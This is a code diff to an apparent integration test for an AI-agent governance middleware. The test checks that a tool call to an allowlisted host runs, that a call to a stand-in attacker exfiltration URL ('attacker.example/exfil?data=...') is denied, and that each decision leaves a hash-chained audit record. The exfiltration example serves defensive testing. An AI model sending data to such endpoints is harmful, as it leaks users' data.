@@ -3,8 +3,9 @@
 The full hot path, exercised against the SQLite-backed Store (D-14, no Docker):
 
     ToolCallRequest -> GovernanceMiddleware.awrap_tool_call -> normalize ->
-    Pipeline.evaluate (identity -> policy(OPA WASM) -> risk -> graduated) ->
-    allow (handler runs) | deny (handler NOT called) + one hash-chained AuditRecord.
+    Pipeline.evaluate (identity -> enrichment -> policy(constitution WASM) -> risk
+    -> graduated) -> allow (handler runs) | deny (handler NOT called) + one
+    hash-chained AuditRecord.
 
 Driving choice (documented per the plan): we drive the middleware DIRECTLY with a
 constructed `ToolCallRequest` rather than spinning up a real LLM via `create_agent`.
@@ -18,7 +19,7 @@ the slice.
 Two records, two outcomes, one chain:
   - allowlisted https://api.example.com/... -> the tool runs, outcome allow, 1 audit row;
   - attacker   https://attacker.example/exfil?data=... -> blocked (handler not called),
-    outcome deny, audit row carrying `egress_allowlist_violation`;
+    outcome deny, audit row citing fired principle 1.1;
   - the two records hash-chain (second.prev_hash == first.record_hash).
 """
 
@@ -98,8 +99,11 @@ def test_attacker_fetch_is_blocked_and_audited(pipeline_with_principle) -> None:
     rows = _audit_rows(wired)
     assert len(rows) == 1
     assert rows[0].body["outcome"] == Outcome.deny.value
-    reason_codes = [r["code"] for r in rows[0].body["reasons"]]
-    assert "egress_allowlist_violation" in reason_codes
+    # The fired constitution principle (1.1 egress allowlist) is cited with provenance.
+    assert any(
+        r["code"] == "constitution_principle_fired" and r["principle_ref"] == "1.1"
+        for r in rows[0].body["reasons"]
+    )
 
 
 def test_allow_then_deny_audit_records_hash_chain(pipeline_with_principle) -> None:
